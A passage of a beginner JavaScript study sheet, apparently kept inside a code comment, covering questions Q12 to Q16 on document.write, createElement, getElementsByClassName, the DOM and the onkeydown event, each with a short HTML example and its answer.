			The HTML event, onmouseover, occurs when the user moves the mouse pointer into the HTML element.

Q12: You are testing a webpage and wish to write some text directly into an HTML document.
		<!DOCTYPE html>
		<html>
		<body>
			<script>
				document.write("Test Output to HTML Page!");
			</script>
		</body>
		</html>
			The document.write() method allows us to write some text directly to a HTML document.

Q13: When the Press to add a Text Area! button is clicked, an HTML <textarea> element should be added to the webpage.
		<!DOCTYPE html>
		<html>
		<body>
			<p>
				Click the button to add a textarea element!
			</p>
			<button onclick="addTextArea()">
				Press to add a textarea!
			</button>
			<script>
				function addTextArea()
				{
					var text_area = document.createElement("textarea");
					document.body.appendChild(text_area);
				}
			</script>
		</body>
		</html>
			The document.createElement() method creates an Element Node with the specified name.

Q14: You have been asked to display a count of the number of custom classes found in a webpage that is currently under development.
		<!DOCTYPE html>
		<html>
		<body>
			<div class="Social_Media"></div>
			<button onclick="displayNoOfCustomClasses()">
				Calculate No. of Custom Classes
			</button>
			<script>
				function displayNoOfCustomClasses()
				{
				  var noCustomClasses = document.getElementsByClassName("Social_Media").length;
				  alert("The total number of custom classes used in the web page: " + noCustomClasses);
				}
			</script>
		</body>
		</html>
			The document.getElementsByClassName() method returns a collection of all elements in the document, which match the specified class name.

Q15: Which term is being described in the following narrative?
		It represents the structure of a webpage and is created when HTML is parsed by a browser.
		It represents the document as nodes and objects.
		It is an object-oriented representation of a webpage, which can be modified with a scripting language such as JavaScript.
			The Document Object Model (DOM)

Q16: The onkeydown event triggers an action only when a user presses the down arrow key on the keyboard. Is this statement true or false?
		False
			 The onkeydown event triggers an action when any key is pressed on the keyboard, not just the down arrow key.
*/